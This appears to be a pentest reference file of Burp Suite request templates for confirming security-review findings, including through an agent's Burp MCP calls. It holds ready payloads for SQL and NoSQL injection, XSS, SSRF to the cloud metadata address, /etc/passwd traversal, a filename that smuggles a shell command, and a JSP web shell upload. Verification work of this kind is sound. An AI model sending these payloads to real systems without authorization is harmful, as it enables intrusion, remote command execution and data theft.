# Burp Suite PoC Request Templates

Use these templates for every **TRUE POSITIVE** with an HTTP attack surface. Adapt host, path, auth, and payloads to the target app discovered during Graphify recon.

## Rules (MANDATORY)

1. **One primary Burp request per finding** — copy-paste ready for Burp Repeater.
2. **Include prerequisites** — auth cookies, tokens, headers, prior steps.
3. **Mark injection points** — prefix tainted values with `§payload§` when suitable for Intruder.
4. **Never include real secrets** — use placeholders: `[SSO_TOKEN]`, `[BASIC_AUTH]`, `[API_KEY]`.
5. **Label environment** — `Host: staging.example.com` vs production; note if destructive.
6. **Expected indicators** — status code, body substring, timing, or error that confirms exploit.
7. **Skip section** — if finding is code-only (no HTTP), write `N/A — not HTTP-exploitable; see Attack Vectors`.

---

## Generic Template

```http
[METHOD] [PATH][?query] HTTP/1.1
Host: [TARGET_HOST]
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Content-Type: application/json
[Cookie: session=[SESSION_COOKIE]]
[Authorization: Bearer [TOKEN]]
[Other-Required-Header: value]

[REQUEST BODY — JSON, form-urlencoded, or empty]
```

**Prerequisites:** [login step / token source / role required]

**Payload variation (Intruder):** `[parameter]` = `§payload§`

**Expected confirmation:** HTTP [code]; response contains `[string]` / time delay > N sec

**Burp notes:** Repeater → send unauthenticated first → then with victim session for stored XSS/IDOR.

---

## SQL Injection (GET param)

```http
GET /api/users?id=§1' OR '1'='1'--§ HTTP/1.1
Host: [TARGET_HOST]
Accept: application/json
```

**Intruder payloads:** `' OR '1'='1'--`, `' UNION SELECT NULL,username,password FROM users--`, `' AND SLEEP(5)--`

**Expected:** 200 with extra rows / 500 with SQL syntax error / 5s delay (time-based)

---

## SQL Injection (POST JSON)

```http
POST /api/search HTTP/1.1
Host: [TARGET_HOST]
Content-Type: application/json

{"query":"§test' OR 1=1--§","limit":10}
```

---

## NoSQL Injection (MongoDB operator)

```http
POST /api/internal/db/bookings HTTP/1.1
Host: [TARGET_HOST]
Authorization: Basic [BASE64_USER_PASS]
postman-key: [POSTMAN_KEY]
Content-Type: application/json

{
  "query": {
    "order_id": {"$regex": ".*"},
    "status": {"$ne": null}
  },
  "projection": {"order_id": 1, "pnr_number": 1}
}
```

**Expected:** 200 with array of booking records beyond authorized scope

---

## Reflected XSS (GET)

```http
GET /api/search?q=§<script>alert(document.domain)</script>§ HTTP/1.1
Host: [TARGET_HOST]
Accept: text/html
```

**Expected:** payload unescaped in HTML body; try event handlers if `<script>` filtered: `"><img src=x onerror=alert(1)>`

---

## Stored XSS (requires prior write)

**Step 1 — store payload:**
```http
POST /api/profile HTTP/1.1
Host: [TARGET_HOST]
Cookie: session=[SESSION]
Content-Type: application/json

{"displayName":"§');alert(1);//§"}
```

**Step 2 — trigger render (victim or self):**
```http
GET /api/cancelPage?order_id=[ORDER_ID] HTTP/1.1
Host: [TARGET_HOST]
Cookie: session=[VICTIM_SESSION]
Accept: text/html
```

---

## SSRF (URL param / JSON body)

```http
POST /api/fetch HTTP/1.1
Host: [TARGET_HOST]
Content-Type: application/json

{"url":"§http://169.254.169.254/latest/meta-data/§"}
```

**OOB confirm:** `"url":"http://[BURP_COLLABORATOR]/ssrf-test"`

---

## IDOR / Broken Access Control

```http
GET /api/orders/§27009433439§/details HTTP/1.1
Host: [TARGET_HOST]
Accept: application/json
```

**Test matrix:** no auth → other user's ID → admin ID. Compare 200 vs 401/403.

---

## Authentication Bypass

```http
GET /api/admin/users HTTP/1.1
Host: [TARGET_HOST]
X-Forwarded-For: 127.0.0.1
```

Or missing/empty auth on protected route:
```http
GET /api/cst/order/details?order_id=§ORDER_ID§ HTTP/1.1
Host: [TARGET_HOST]
Accept: application/json
```

---

## Command Injection (filename / param)

```http
POST /api/upload HTTP/1.1
Host: [TARGET_HOST]
Content-Type: multipart/form-data; boundary=----BurpBoundary

------BurpBoundary
Content-Disposition: form-data; name="file"; filename="§test; id>.png§"
Content-Type: image/png

[binary]
------BurpBoundary--
```

---

## Path Traversal / LFI

```http
GET /api/download?file=§../../../etc/passwd§ HTTP/1.1
Host: [TARGET_HOST]
```

---

## JWT / Token Issues

```http
GET /api/protected HTTP/1.1
Host: [TARGET_HOST]
Authorization: Bearer §eyJhbGciOiJub25lI...§
```

**Tests:** alg=none, key confusion, expired token reuse, missing signature

---

## Mass Assignment / Webhook Forgery

```http
POST /api/order/status_update HTTP/1.1
Host: [TARGET_HOST]
Content-Type: application/json

{"order_id":"§ORDER_ID§","status":"CANCELLED","fulfillment_id":"§FORGED§"}
```

---

## File Upload (unrestricted type)

```http
POST /api/upload HTTP/1.1
Host: [TARGET_HOST]
Content-Type: multipart/form-data; boundary=----BurpBoundary

------BurpBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
------BurpBoundary--
```

---

## Unauthenticated Endpoint Verification (AUTH findings)

Send **without** `Cookie`, `Authorization`, or SSO headers. Used for Phase 1b live verification via Burp MCP (`send_http1_request`).

```http
GET /api/trains/v1/order/details?order_id=§ORDER_ID§ HTTP/1.1
Host: [TARGET_HOST]
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Connection: close

```

**MCP call:** `user-burp` → `send_http1_request` with `usesHttps: true`, `targetPort: 443`.

**Verified in Burp (→ High):**
- HTTP 2xx with business JSON/HTML (order data, PII field names, not login redirect)
- HTTP 4xx validation error **without** auth challenge (proves handler reached)

**Not Verified (→ Medium):**
- 401/403 auth error, login redirect, WAF block only
- Burp MCP unavailable — code review only

**Comparer test:** duplicate request with victim `Cookie:` — if both return same data → IDOR + missing auth.

---

## Burp Workflow Cheat Sheet

| Goal | Burp tool | Action |
|------|-----------|--------|
| Manual replay | Repeater | Paste raw request, tweak payload |
| Fuzz param | Intruder | Replace value with `§payload§`, load payload list |
| Blind SSRF/OOB | Collaborator | Embed collaborator URL in payload |
| Session handling | Repeater + macro | Login macro auto-refresh cookie |
| Compare access | Comparer | Response with vs without auth |
